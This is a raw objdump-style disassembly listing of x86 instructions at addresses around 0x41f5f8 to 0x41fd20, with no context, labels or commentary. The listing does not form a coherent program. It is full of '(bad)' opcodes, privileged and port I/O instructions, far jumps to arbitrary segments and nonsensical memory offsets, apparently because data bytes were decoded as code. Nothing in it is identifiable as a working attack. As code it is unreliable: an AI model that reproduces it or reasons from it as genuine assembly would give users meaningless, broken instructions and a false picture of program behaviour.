  41f5f8:	ins    BYTE PTR es:[edi],dx
  41f5f9:	ret    
  41f5fa:	jo     0x41f663
  41f5fc:	(bad)  
  41f5fd:	imul   eax,ecx,0x59
  41f600:	or     BYTE PTR [edi-0x45],0xec
  41f604:	pop    esp
  41f605:	stos   DWORD PTR es:[edi],eax
  41f606:	xchg   ecx,eax
  41f607:	xchg   edi,eax
  41f608:	sub    BYTE PTR [eax],0x1f
  41f60b:	xor    DWORD PTR [esi+0x4e],esp
  41f60e:	or     ch,cl
  41f610:	into   
  41f611:	outs   dx,DWORD PTR ds:[esi]
  41f612:	iret   
  41f613:	pop    ss
  41f614:	cli    
  41f615:	lods   eax,DWORD PTR ds:[esi]
  41f616:	pusha  
  41f617:	bound  esp,QWORD PTR [edx]
  41f619:	mov    eax,0x3aaaeb58
  41f61e:	xlat   BYTE PTR ds:[ebx]
  41f61f:	adc    ah,0xfd
  41f622:	dec    eax
  41f623:	pop    edi
  41f624:	pusha  
  41f625:	(bad)  
  41f626:	jecxz  0x41f658
  41f628:	in     eax,dx
  41f629:	lds    edi,FWORD PTR [ebx+0x7]
  41f62c:	mov    edx,0x79365e3a
  41f631:	mov    bl,0x9c
  41f633:	lds    esp,FWORD PTR [ecx+0x21]
  41f636:	lods   al,BYTE PTR ds:[esi]
  41f637:	rol    ah,cl
  41f639:	jg     0x41f635
  41f63b:	sar    DWORD PTR [edx+0x19dc9f33],0x1e
  41f642:	out    dx,eax
  41f643:	icebp  
  41f644:	shl    ah,1
  41f646:	setg   BYTE PTR [esi]
  41f649:	sub    DWORD PTR [edi+0x3b],eax
  41f64c:	shr    BYTE PTR [edi+0x618bd7b1],1
  41f652:	or     esi,DWORD PTR [ebp+0x1a]
  41f655:	cmp    al,0xa6
  41f657:	lods   eax,DWORD PTR ds:[esi]
  41f658:	mov    WORD PTR [esp+ebp*1-0x7454799a],cs
  41f65f:	xlat   BYTE PTR ds:[ebx]
  41f660:	lds    ecx,FWORD PTR [ebp-0x3a]
  41f663:	(bad)  
  41f664:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f665:	push   0x8872f590
  41f66a:	sub    eax,0x4bb6fbe
  41f66f:	or     BYTE PTR [edx-0xb],0x14
  41f673:	adc    eax,0xfbc191af
  41f678:	scas   al,BYTE PTR es:[edi]
  41f679:	es shl al,0x74
  41f67d:	mov    esi,0x2d60efde
  41f682:	stc    
  41f683:	xchg   ebp,eax
  41f684:	aaa    
  41f685:	and    al,0x34
  41f687:	std    
  41f688:	inc    ecx
  41f689:	sbb    DWORD PTR [eax+0x52],ecx
  41f68c:	cli    
  41f68d:	xor    ah,ch
  41f68f:	cmp    edi,DWORD PTR [edi-0x1232bec0]
  41f695:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f696:	cmp    BYTE PTR [ebx+ebp*8-0x4ac56a92],bh
  41f69d:	sub    BYTE PTR [esi],cl
  41f69f:	adc    ebp,ebp
  41f6a1:	dec    edx
  41f6a2:	test   al,0x45
  41f6a4:	sub    edi,esi
  41f6a6:	es jmp 0x41f6ac
  41f6a9:	xlat   BYTE PTR ds:[ebx]
  41f6ab:	cli    
  41f6ac:	mov    ch,0x88
  41f6ae:	cdq    
  41f6af:	inc    edx
  41f6b0:	pop    esi
  41f6b1:	adc    DWORD PTR [ecx+0x4ae9ce5f],esp
  41f6b7:	dec    di
  41f6b9:	sbb    BYTE PTR [eax-0x64],0x51
  41f6bd:	pop    ebp
  41f6be:	jge    0x41f681
  41f6c0:	xor    edi,ecx
  41f6c2:	add    eax,0x7be8d9bb
  41f6c7:	mov    dh,0x8d
  41f6c9:	inc    edx
  41f6ca:	pop    es
  41f6cb:	and    DWORD PTR [ebp+0x0],0xffffffcc
  41f6cf:	jmp    0xc553:0x6f643cc7
  41f6d6:	sbb    eax,0xdd6ba082
  41f6db:	push   es
  41f6dc:	cmc    
  41f6dd:	xor    al,BYTE PTR [ebx+0x1a4fc2c4]
  41f6e3:	sub    dl,BYTE PTR [ebx+ecx*4-0x49ba052d]
  41f6ea:	mov    dh,0x28
  41f6ec:	cmp    BYTE PTR [ecx-0x3],al
  41f6ef:	fdiv   QWORD PTR [esi-0x17]
  41f6f2:	jg     0x41f739
  41f6f4:	inc    esi
  41f6f5:	sbb    esp,ebp
  41f6f7:	dec    eax
  41f6f8:	(bad)
  41f6fb:	push   ebx
  41f6fc:	mov    al,ds:0xd3ab6ca9
  41f701:	ds pop ss
  41f703:	retf   
  41f704:	shr    DWORD PTR [ebp+0x2a],cl
  41f707:	gs in  eax,0x51
  41f70a:	ins    DWORD PTR es:[edi],dx
  41f70b:	ret    
  41f70c:	sbb    DWORD PTR [edx-0x56],edi
  41f70f:	pusha  
  41f710:	mov    bh,0x57
  41f712:	dec    eax
  41f713:	ins    DWORD PTR es:[edi],dx
  41f714:	xor    ch,BYTE PTR [eax+0x3a]
  41f717:	xor    esi,DWORD PTR [esi-0x3f02b3bd]
  41f71d:	sub    ch,BYTE PTR [edi+0x61]
  41f720:	shl    esp,0x43
  41f723:	idiv   edx
  41f725:	mov    dh,0x84
  41f727:	cwde   
  41f728:	pop    ebp
  41f729:	mov    bl,0xc2
  41f72b:	imul   esp,edi,0x681dabce
  41f731:	int    0x1a
  41f733:	sub    al,0x26
  41f735:	xchg   esi,eax
  41f736:	jl     0x41f733
  41f738:	mov    ebx,0xc2138b4b
  41f73d:	cmp    BYTE PTR [eax-0x130942b0],bl
  41f743:	inc    eax
  41f744:	mov    al,ds:0x834a522b
  41f749:	scas   eax,DWORD PTR es:[edi]
  41f74a:	daa    
  41f74b:	pushf  
  41f74c:	push   ss
  41f74d:	arpl   WORD PTR [ebp+esi*2+0x26],bx
  41f751:	push   ss
  41f752:	push   es
  41f753:	add    dh,BYTE PTR [edx-0x4ccc1d4b]
  41f759:	in     al,0x45
  41f75b:	mov    ds:0x2f76bdac,eax
  41f760:	mov    eax,ds:0x896362a8
  41f765:	fdiv   QWORD PTR [ebp-0x3c]
  41f768:	sbb    al,BYTE PTR [ebx-0x5b]
  41f76b:	fistp  DWORD PTR [esi-0x47]
  41f76e:	(bad)  
  41f76f:	fisub  DWORD PTR [ecx+0x63]
  41f772:	xchg   esi,eax
  41f773:	sub    eax,0xb67138ba
  41f778:	stc    
  41f779:	jmp    0xfda:0xdbb5849b
  41f780:	mov    esi,0xb8fc5002
  41f785:	test   al,0x1
  41f787:	lahf   
  41f788:	jne    0x41f76b
  41f78a:	mov    edx,ebp
  41f78c:	nop    DWORD PTR [esi+0x1bf45324]
  41f793:	jl     0x41f77c
  41f795:	test   dh,cl
  41f797:	loope  0x41f7cf
  41f799:	mov    dh,0x45
  41f79b:	scas   eax,DWORD PTR es:[edi]
  41f79c:	xchg   ebx,eax
  41f79d:	into   
  41f79e:	sbb    esi,DWORD PTR [eax+0x1b94ffc7]
  41f7a4:	jne    0x41f769
  41f7a6:	daa    
  41f7a7:	dec    esp
  41f7a8:	(bad)  [esi-0x28fd31de]
  41f7ae:	scas   al,BYTE PTR es:[edi]
  41f7af:	outs   dx,BYTE PTR ds:[esi]
  41f7b0:	push   ebp
  41f7b1:	sub    al,0x23
  41f7b3:	and    esi,DWORD PTR [esi]
  41f7b5:	push   0xd
  41f7b7:	push   edi
  41f7b8:	jge    0x41f807
  41f7ba:	or     dh,BYTE PTR ds:0x389de6f5
  41f7c0:	xchg   ebx,eax
  41f7c1:	adc    dl,cl
  41f7c3:	xor    DWORD PTR [ecx-0x4c63037b],eax
  41f7c9:	push   edi
  41f7ca:	mov    esi,0x58d2d89b
  41f7cf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f7d0:	fst    DWORD PTR [edx]
  41f7d2:	adc    DWORD PTR [esi],ebp
  41f7d4:	add    cl,bh
  41f7d6:	push   ecx
  41f7d7:	jp     0x41f82b
  41f7d9:	dec    ebx
  41f7da:	xor    al,0x86
  41f7dc:	push   0x79
  41f7de:	mov    edx,0x157b9816
  41f7e3:	jnp    0x41f830
  41f7e5:	jg     0x41f7db
  41f7e7:	scas   eax,DWORD PTR es:[edi]
  41f7e8:	push   0x4e0964c2
  41f7ed:	iret   
  41f7ee:	rcr    BYTE PTR [ecx+0x4dffebc6],0x7e
  41f7f5:	jbe    0x41f791
  41f7f7:	retf   
  41f7f8:	clc    
  41f7f9:	pop    es
  41f7fa:	outs   dx,BYTE PTR ds:[esi]
  41f7fb:	ficomp WORD PTR [ebx+0x3d]
  41f7fe:	in     al,0x2
  41f800:	addr16 iret 
  41f802:	sbb    DWORD PTR [ebp+0x63],esp
  41f805:	iret   
  41f806:	xchg   ebx,eax
  41f807:	ins    DWORD PTR es:[edi],dx
  41f808:	xchg   ebx,eax
  41f809:	xor    eax,0xeb674242
  41f80e:	cmp    ch,BYTE PTR [ecx-0x5451f742]
  41f814:	aas    
  41f815:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f816:	outs   dx,BYTE PTR ds:[esi]
  41f817:	dec    edx
  41f818:	test   DWORD PTR [ebp-0x2d],esi
  41f81b:	pop    es
  41f81c:	push   edi
  41f81d:	xchg   edx,eax
  41f81e:	and    DWORD PTR [edi],ebp
  41f820:	clc    
  41f821:	in     al,0x7c
  41f823:	add    ecx,eax
  41f825:	fdiv   st,st(3)
  41f827:	jnp    0x41f89c
  41f829:	sbb    DWORD PTR [edi],edx
  41f82b:	cmp    eax,0xa449b6f7
  41f830:	test   BYTE PTR [esi-0x65],cl
  41f833:	mov    edx,0xd00fd184
  41f838:	inc    eax
  41f839:	xor    DWORD PTR [esi],0xffffffec
  41f83c:	pop    ecx
  41f83d:	jbe    0x41f859
  41f83f:	mov    ah,0xf2
  41f841:	mov    ch,BYTE PTR [ecx]
  41f843:	fild   QWORD PTR [esp+esi*4-0x7217d6e7]
  41f84a:	dec    esi
  41f84b:	fsubr  DWORD PTR [ebx-0x7d72ab80]
  41f851:	popf   
  41f852:	xor    ch,BYTE PTR [edi+0x66]
  41f855:	sbb    al,0x89
  41f857:	inc    edx
  41f858:	cmp    cl,BYTE PTR [ebx-0x61]
  41f85b:	cmp    BYTE PTR [edx],dl
  41f85d:	inc    esi
  41f85e:	and    BYTE PTR [esi-0x56],ah
  41f861:	lods   al,BYTE PTR ds:[esi]
  41f862:	add    cl,BYTE PTR [esi]
  41f864:	jo     0x41f82b
  41f866:	loopne 0x41f88f
  41f868:	aad    0xf
  41f86a:	or     ebx,DWORD PTR ds:0xa25325ce
  41f870:	mov    ch,0xd4
  41f872:	lahf   
  41f873:	pop    ebx
  41f874:	cdq    
  41f875:	jo     0x41f88b
  41f877:	xor    al,0xce
  41f879:	adc    DWORD PTR [ecx-0x5e],edx
  41f87c:	mov    DWORD PTR [ecx+ecx*8],esi
  41f87f:	daa    
  41f880:	pop    ebp
  41f881:	test   al,0x2
  41f883:	gs inc ebp
  41f885:	out    0xee,al
  41f887:	nop
  41f888:	sar    DWORD PTR [edi],0x56
  41f88b:	jle    0x41f85c
  41f88d:	outs   dx,BYTE PTR ds:[esi]
  41f88e:	and    eax,0xea2cba47
  41f893:	call   0xf8ed713
  41f898:	mov    DWORD PTR [eax-0x7b],0xcd19a55b
  41f89f:	sbb    BYTE PTR [ecx],ah
  41f8a1:	add    al,0x20
  41f8a3:	data16 jae 0x41f83e
  41f8a6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f8a7:	ins    BYTE PTR es:[edi],dx
  41f8a8:	ss int3 
  41f8aa:	jmp    0xe2a3:0xa2e40e82
  41f8b1:	in     al,0xef
  41f8b3:	test   cl,al
  41f8b5:	or     DWORD PTR ds:0x560eea8e,esi
  41f8bb:	xchg   BYTE PTR [esi],cl
  41f8bd:	retf   
  41f8be:	and    eax,DWORD PTR [ebp*4-0x53f95646]
  41f8c5:	fisub  WORD PTR [eax+0x7da5cacc]
  41f8cb:	xor    eax,0x7188f54e
  41f8d0:	pop    ebp
  41f8d1:	cmp    eax,0x4a190c2e
  41f8d6:	xor    BYTE PTR [edi],0xe5
  41f8d9:	nop
  41f8da:	lds    edx,FWORD PTR [ebx-0x2c303ff5]
  41f8e0:	cli    
  41f8e1:	outs   dx,BYTE PTR ds:[esi]
  41f8e2:	mov    edx,0x51ecc7f3
  41f8e7:	jmp    0x41f8d2
  41f8e9:	jle    0x41f927
  41f8eb:	scas   al,BYTE PTR es:[edi]
  41f8ec:	imul   ebp,DWORD PTR [esi+0x2985f1eb],0x4efa51bd
  41f8f6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f8f7:	xor    BYTE PTR [esi-0x72808393],dh
  41f8fd:	stc    
  41f8fe:	and    DWORD PTR ds:0x18dfed1c,ecx
  41f904:	mov    al,0x7
  41f906:	cmp    ebx,edi
  41f908:	fcomp  QWORD PTR [ecx-0x2a]
  41f90b:	and    BYTE PTR [ecx-0x3a],ah
  41f90e:	add    DWORD PTR [eax+0x608f6516],eax
  41f914:	sbb    bl,BYTE PTR [ebp+0x48846ab]
  41f91a:	jmp    0xbebb:0xc733a3bb
  41f921:	xlat   BYTE PTR ds:[ebx]
  41f922:	sub    bl,bh
  41f924:	outs   dx,DWORD PTR ds:[esi]
  41f925:	jae    0x41f920
  41f927:	or     BYTE PTR [esi+0x24],dh
  41f92a:	adc    ah,BYTE PTR [edx+0x6a2aafd8]
  41f930:	sahf   
  41f931:	pop    ds
  41f932:	mov    al,0x78
  41f934:	mov    ebx,0xb4402651
  41f939:	push   es
  41f93a:	xchg   esi,eax
  41f93b:	sub    dh,BYTE PTR [esi]
  41f93d:	in     al,dx
  41f93e:	or     al,0x2e
  41f940:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f941:	jo     0x41f8d3
  41f943:	rcl    BYTE PTR [ecx],0x7c
  41f946:	dec    esi
  41f947:	leave  
  41f948:	xchg   edi,eax
  41f949:	cmp    al,BYTE PTR [esi-0x36]
  41f94c:	cmp    ah,cl
  41f94e:	popa   
  41f94f:	aaa    
  41f950:	dec    ebx
  41f951:	push   ss
  41f952:	mov    bh,0x67
  41f954:	add    BYTE PTR [eax],bl
  41f956:	out    dx,al
  41f957:	pop    edx
  41f958:	fwait
  41f959:	out    0x59,al
  41f95b:	loop   0x41f908
  41f95d:	stos   BYTE PTR es:[edi],al
  41f95e:	mov    ebp,0x5a9e20f9
  41f963:	pusha  
  41f964:	popa   
  41f965:	sbb    BYTE PTR [ecx+edx*1-0x28fc0491],cl
  41f96c:	dec    edx
  41f96d:	aam    0xa7
  41f96f:	xchg   ebp,eax
  41f970:	gs mov ch,0xa
  41f973:	lods   eax,DWORD PTR ds:[esi]
  41f974:	pop    ecx
  41f975:	mov    esp,0xf9ef1fe2
  41f97a:	and    al,0x17
  41f97c:	sbb    al,0xb1
  41f97e:	sbb    BYTE PTR [ecx+0x52],ah
  41f981:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f982:	mov    ebp,0xd47add2b
  41f987:	hlt    
  41f988:	sub    esp,esp
  41f98a:	ja     0x41f91c
  41f98c:	mov    edx,0xd79fb44e
  41f991:	pop    ebx
  41f992:	aam    0xbf
  41f994:	lahf   
  41f995:	(bad)  
  41f996:	aam    0xde
  41f998:	add    BYTE PTR [esi+0x43],cl
  41f99b:	jmp    FWORD PTR [eax]
  41f99d:	cmp    DWORD PTR [edx-0x2c11c015],esi
  41f9a3:	clc    
  41f9a4:	or     ebp,edi
  41f9a6:	dec    esi
  41f9a7:	sub    eax,0x93637ec
  41f9ac:	repnz in al,0x49
  41f9af:	pop    ebp
  41f9b0:	adc    BYTE PTR [eax+0x5d],ah
  41f9b3:	mov    DWORD PTR [edi+0x7e],esi
  41f9b6:	test   BYTE PTR [ebp-0x65],bl
  41f9b9:	loopne 0x41f9ad
  41f9bb:	sbb    edi,DWORD PTR [eax]
  41f9bd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f9be:	int3   
  41f9bf:	push   eax
  41f9c0:	mov    ah,0x5f
  41f9c2:	jle    0x41fa40
  41f9c4:	and    ecx,DWORD PTR [edx+0x1d424201]
  41f9ca:	jmp    0x79c2:0x59f9b4b2
  41f9d1:	push   esp
  41f9d2:	out    0x66,al
  41f9d4:	cli    
  41f9d5:	mov    cl,0x78
  41f9d7:	cmp    al,0x7f
  41f9d9:	in     al,dx
  41f9da:	push   eax
  41f9db:	xchg   ebp,eax
  41f9dc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f9dd:	inc    esp
  41f9de:	inc    eax
  41f9df:	inc    ebp
  41f9e0:	jg     0x41f99b
  41f9e2:	outs   dx,DWORD PTR ds:[esi]
  41f9e3:	test   ecx,edi
  41f9e5:	or     edx,DWORD PTR [edx+0x3c]
  41f9e8:	pop    ss
  41f9e9:	jmp    0x5c86a61a
  41f9ee:	(bad)  
  41f9ef:	jne    0x41f9a1
  41f9f1:	fst    DWORD PTR [ebp+0x1481bf7d]
  41f9f7:	aad    0xb4
  41f9f9:	pop    es
  41f9fa:	test   DWORD PTR [esi+eiz*4+0x4a9f45fa],eax
  41fa01:	lock call 0x29fd014c
  41fa07:	push   esi
  41fa08:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fa09:	push   ecx
  41fa0a:	int    0x71
  41fa0c:	je     0x41f9a4
  41fa0e:	adc    ebp,DWORD PTR [ecx+0x63189745]
  41fa14:	inc    esi
  41fa15:	mov    DWORD PTR [eax+0x19c2b8a6],edx
  41fa1b:	and    ecx,ebp
  41fa1d:	pop    ecx
  41fa1e:	push   ds
  41fa1f:	xchg   BYTE PTR [edx+edx*2],bl
  41fa22:	jno    0x41fa30
  41fa24:	jmp    0x26d3879a
  41fa29:	loopne 0x41fa7f
  41fa2b:	dec    edi
  41fa2c:	test   eax,0x470cbb7d
  41fa31:	mov    ah,0x2d
  41fa33:	xchg   edx,eax
  41fa34:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fa35:	or     ebp,DWORD PTR [esi+0x3288adbc]
  41fa3b:	mov    edx,0x5ea9514b
  41fa40:	mov    esi,0x7d8a9e35
  41fa45:	dec    esp
  41fa46:	cmp    eax,0x553560a8
  41fa4b:	loopne 0x41faca
  41fa4d:	adc    eax,0xc59d8371
  41fa52:	mov    DWORD PTR [esi+0xc218ce3],edx
  41fa58:	ja     0x41fa24
  41fa5a:	in     eax,dx
  41fa5b:	mov    eax,0xdcebe59
  41fa60:	lock adc al,0x92
  41fa63:	loop   0x41fa7b
  41fa65:	push   cs
  41fa66:	mov    dh,0x79
  41fa68:	and    bh,ah
  41fa6a:	dec    esi
  41fa6b:	fdiv   st,st(0)
  41fa6d:	popa   
  41fa6e:	fsub   DWORD PTR [ecx-0x4d]
  41fa71:	repnz adc DWORD PTR ds:0x2920cad0,ebp
  41fa78:	call   0xc25eba14
  41fa7d:	or     ebp,DWORD PTR [eax+0x51]
  41fa80:	jmp    0xd8f0a2c7
  41fa85:	dec    ecx
  41fa86:	ins    DWORD PTR es:[edi],dx
  41fa87:	sahf   
  41fa88:	xchg   esp,eax
  41fa89:	inc    esi
  41fa8a:	test   DWORD PTR [esi+eax*4-0x6c],ebx
  41fa8e:	or     BYTE PTR [edi],0x7a
  41fa91:	ret    0x4f52
  41fa94:	data16 loopne 0x41fa34
  41fa97:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fa98:	ins    DWORD PTR es:[edi],dx
  41fa99:	mov    ds:0x66326b1c,eax
  41fa9e:	mov    bl,0xa2
  41faa0:	sub    al,0xc7
  41faa2:	jge    0x41fb1a
  41faa4:	(bad)  
  41faa5:	test   BYTE PTR [eax-0x8],0xb5
  41faa9:	frstor [edi]
  41faab:	xchg   edx,eax
  41faac:	dec    ebx
  41faad:	push   es
  41faae:	jne    0x41fa60
  41fab0:	repnz into 
  41fab2:	push   ebx
  41fab3:	popf   
  41fab4:	jl     0x41fa5a
  41fab6:	mov    edi,0xc5ae96f5
  41fabb:	fstp   QWORD PTR [edx+0x1de63e23]
  41fac1:	fist   DWORD PTR [ebp+0x7b]
  41fac4:	and    DWORD PTR [edi-0x13],edi
  41fac7:	nop
  41fac8:	test   DWORD PTR [ebx-0x7539ead7],esp
  41face:	mov    ebx,0x9e5e083d
  41fad3:	(bad)
  41fad6:	test   dl,dh
  41fad8:	test   eax,0xd0bfb8c
  41fadd:	and    ebx,DWORD PTR [edx]
  41fadf:	adc    BYTE PTR cs:[esi-0x62],cl
  41fae3:	mov    cl,0x9a
  41fae5:	xor    eax,0xdadb9de8
  41faea:	jae    0x41fb36
  41faec:	out    dx,ax
  41faee:	sbb    dl,dh
  41faf0:	jl     0x41faac
  41faf2:	xchg   ebx,eax
  41faf3:	pop    esp
  41faf4:	aas    
  41faf5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41faf6:	sahf   
  41faf7:	pop    edx
  41faf8:	pop    eax
  41faf9:	sub    BYTE PTR [esi],ch
  41fafb:	loopne 0x41fadf
  41fafd:	in     al,0x9
  41faff:	and    esp,esp
  41fb01:	and    eax,0x977f02ac
  41fb06:	std    
  41fb07:	xor    BYTE PTR [ebx-0x1f80fb10],0xe0
  41fb0e:	jmp    0x5e7b:0x5a3
  41fb14:	out    0x22,al
  41fb16:	shr    BYTE PTR [esi+0x63],0xb3
  41fb1a:	mov    dl,0xdc
  41fb1c:	pop    ss
  41fb1d:	jle    0x41fb8b
  41fb1f:	and    BYTE PTR ds:0x7e59db12,dh
  41fb25:	std    
  41fb26:	imul   esi,ecx,0xa9869013
  41fb2c:	out    dx,eax
  41fb2d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fb2e:	and    eax,0x22a61ccc
  41fb33:	ja     0x41fb5a
  41fb35:	mov    ds:0xfeb366a6,eax
  41fb3a:	(bad)  
  41fb3b:	int    0xfe
  41fb3d:	jmp    0xbdbf30b6
  41fb42:	cld    
  41fb43:	out    0xb1,al
  41fb45:	push   es
  41fb46:	sbb    ch,BYTE PTR [edx+0x627f6377]
  41fb4c:	ret    0x8f8f
  41fb4f:	nop
  41fb50:	daa    
  41fb51:	mov    ds:0x472b0ce1,al
  41fb56:	daa    
  41fb57:	repnz into 
  41fb59:	cli    
  41fb5a:	addr16 push edi
  41fb5c:	fild   DWORD PTR ds:0x6e456b5b
  41fb62:	add    eax,0x85bfc6c5
  41fb67:	shl    edx,0x54
  41fb6a:	bound  edi,QWORD PTR [ecx]
  41fb6c:	jp     0x41fbab
  41fb6e:	dec    ecx
  41fb6f:	mov    WORD PTR [ecx-0xb63ec45],?
  41fb75:	or     esp,edi
  41fb77:	and    BYTE PTR [edx+0x9cb4958],cl
  41fb7d:	ja     0x41fb2f
  41fb7f:	pusha  
  41fb80:	or     dl,BYTE PTR [bp+di+0x2d9c]
  41fb85:	jne    0x41fb2c
  41fb87:	jno    0x41fbc6
  41fb89:	ja     0x41fbf5
  41fb8b:	pop    esp
  41fb8c:	sbb    edx,DWORD PTR [esi-0x69]
  41fb8f:	jnp    0x41fb7a
  41fb91:	dec    ecx
  41fb92:	(bad)  
  41fb94:	ror    edi,0xf0
  41fb97:	popf   
  41fb98:	std    
  41fb99:	xchg   ebx,eax
  41fb9a:	jae    0x41fbde
  41fb9c:	iret   
  41fb9d:	or     edi,DWORD PTR [esi]
  41fb9f:	sbb    ebx,DWORD PTR [eax+edi*2]
  41fba2:	mov    ss,WORD PTR [eax-0x42]
  41fba5:	(bad)  
  41fba6:	lods   al,BYTE PTR ds:[esi]
  41fba7:	scas   eax,DWORD PTR es:[edi]
  41fba8:	in     eax,dx
  41fba9:	nop
  41fbaa:	xchg   BYTE PTR [edi+eax*4],dl
  41fbad:	rcl    BYTE PTR [ebx],0xfd
  41fbb0:	xor    eax,0x40921570
  41fbb5:	retf   
  41fbb6:	mov    eax,ds:0xa67b6fef
  41fbbb:	out    0xa4,eax
  41fbbd:	test   al,0x48
  41fbbf:	cmp    BYTE PTR [ebp+0x2a4a0d51],0x94
  41fbc6:	rol    DWORD PTR [ebp+0x77],cl
  41fbc9:	fbstp  TBYTE PTR [esi+0x33ab7de1]
  41fbcf:	nop
  41fbd0:	test   BYTE PTR [edi+0x69],0x21
  41fbd4:	xor    ah,BYTE PTR [edi]
  41fbd6:	push   esp
  41fbd7:	pop    ss
  41fbd8:	clc    
  41fbd9:	stos   DWORD PTR es:[edi],eax
  41fbda:	hlt    
  41fbdb:	data16 aas 
  41fbdd:	fldenv [eax]
  41fbdf:	iret   
  41fbe0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fbe1:	mov    ds:0xd0736a1a,eax
  41fbe6:	in     al,dx
  41fbe7:	loop   0x41fc3e
  41fbe9:	pop    edx
  41fbea:	ret    0xdb2
  41fbed:	pushf  
  41fbee:	pop    esi
  41fbef:	(bad)  
  41fbf0:	in     eax,dx
  41fbf1:	pushf  
  41fbf2:	inc    esi
  41fbf3:	adc    bl,BYTE PTR [eax-0x6f]
  41fbf6:	adc    BYTE PTR [edi],bh
  41fbf8:	pop    es
  41fbf9:	push   esp
  41fbfa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fbfb:	js     0x41fb9d
  41fbfd:	loop   0x41fbfa
  41fbff:	mov    edi,0x9ce1d976
  41fc04:	fild   QWORD PTR [ecx-0x44fbd423]
  41fc0a:	sub    BYTE PTR [edi+0x4],dh
  41fc0d:	mov    ds,WORD PTR [eax-0x6b]
  41fc10:	hlt    
  41fc11:	push   ss
  41fc12:	stc    
  41fc13:	outs   dx,DWORD PTR ds:[esi]
  41fc14:	pusha  
  41fc15:	pop    es
  41fc16:	mov    al,0x3a
  41fc18:	call   FWORD PTR [esp+esi*4-0x69]
  41fc1c:	into   
  41fc1d:	neg    BYTE PTR [esp+ecx*1-0x5d]
  41fc21:	jmp    0x41fc55
  41fc23:	adc    DWORD PTR [ebx+0x45],ebp
  41fc26:	adc    al,0xab
  41fc28:	mov    esi,0xfb5d85fb
  41fc2d:	cld    
  41fc2e:	cmp    eax,0xff1b25dc
  41fc33:	fld    QWORD PTR [eax+edx*1-0x7a]
  41fc37:	push   ss
  41fc38:	ficom  DWORD PTR [esi]
  41fc3a:	punpckhdq mm7,mm5
  41fc3d:	sbb    ecx,DWORD PTR ds:0xd52c8c76
  41fc43:	nop
  41fc44:	cmp    edi,esp
  41fc46:	icebp  
  41fc47:	push   ecx
  41fc48:	test   eax,0x24adbe52
  41fc4d:	shl    DWORD PTR [ebx-0x32],cl
  41fc50:	dec    edx
  41fc51:	dec    ecx
  41fc52:	rcl    BYTE PTR [ecx+0x6fd9c52f],0x5c
  41fc59:	repz aas 
  41fc5b:	iret   
  41fc5c:	pop    ebp
  41fc5d:	in     eax,0x49
  41fc5f:	push   edx
  41fc60:	or     DWORD PTR [ebp+0x11],ebx
  41fc63:	cmp    al,cl
  41fc65:	mov    esp,0xf48e5268
  41fc6a:	test   al,0xcf
  41fc6c:	inc    ecx
  41fc6d:	stc    
  41fc6e:	push   0xffffffba
  41fc70:	and    DWORD PTR [esi-0x6b],edx
  41fc73:	jo     0x41fc6d
  41fc75:	push   esi
  41fc76:	pop    ecx
  41fc77:	dec    ebx
  41fc78:	pop    esi
  41fc79:	pop    ds
  41fc7a:	xor    al,0xf0
  41fc7c:	fwait
  41fc7d:	iret   
  41fc7e:	jge    0x41fce3
  41fc80:	push   cs
  41fc81:	fdivr  DWORD PTR [ecx-0x4b]
  41fc84:	and    ah,bh
  41fc86:	and    edi,DWORD PTR [esi-0x36]
  41fc89:	stos   BYTE PTR es:[edi],al
  41fc8a:	cmp    DWORD PTR [eax],eax
  41fc8c:	mov    al,0x3e
  41fc8e:	pop    eax
  41fc8f:	xchg   DWORD PTR [esi],esi
  41fc91:	retf   0xeca0
  41fc94:	fisttp WORD PTR [eax]
  41fc96:	cmp    al,0x73
  41fc98:	pop    es
  41fc99:	add    al,0x40
  41fc9b:	addr16 enter 0x7417,0x6a
  41fca0:	mov    edi,0x4a04ec4a
  41fca5:	or     eax,0x6f6eff71
  41fcaa:	nop
  41fcab:	lea    ebx,[eax]
  41fcad:	adc    eax,0xb15bec19
  41fcb2:	fadd   DWORD PTR [edi+eax*1-0x58328841]
  41fcb9:	cmp    bh,BYTE PTR [ecx+0x2c]
  41fcbc:	and    al,0x59
  41fcbe:	(bad)  
  41fcc0:	pop    ebx
  41fcc1:	xchg   BYTE PTR [edx-0x23ac1bda],cl
  41fcc7:	fisttp QWORD PTR [ebx]
  41fcc9:	leave  
  41fcca:	jmp    0xaa69cc7f
  41fccf:	mov    edi,0x3c76d31f
  41fcd4:	sub    DWORD PTR [esi-0x34],edx
  41fcd7:	fidiv  DWORD PTR ss:[ecx+0x3ae44027]
  41fcde:	pushf  
  41fcdf:	inc    esp
  41fce0:	call   0x159409ca
  41fce5:	les    esi,FWORD PTR [edx+0x18]
  41fce8:	pop    es
  41fce9:	jns    0x41fcf4
  41fceb:	cmp    eax,0x5eebc4a
  41fcf0:	dec    ecx
  41fcf1:	aam    0xb9
  41fcf3:	rol    ah,1
  41fcf5:	xchg   ebx,eax
  41fcf6:	(bad)  [esi]
  41fcf8:	pop    es
  41fcf9:	dec    ebx
  41fcfa:	jge    0x41fca3
  41fcfc:	pop    ss
  41fcfd:	dec    esi
  41fcfe:	sar    BYTE PTR [ecx+0x66b474c8],1
  41fd04:	ror    cl,cl
  41fd06:	fisttp DWORD PTR [esi+eiz*8-0x309a8357]
  41fd0d:	loope  0x41fd4c
  41fd0f:	jmp    0xbe62:0x3c8401e2
  41fd16:	push   ss
  41fd17:	cli    
  41fd18:	out    dx,al
  41fd19:	sti    
  41fd1a:	adc    al,0x23
  41fd1c:	push   es
  41fd1d:	rol    BYTE PTR [esi+esi*2],1
  41fd20:	retf   
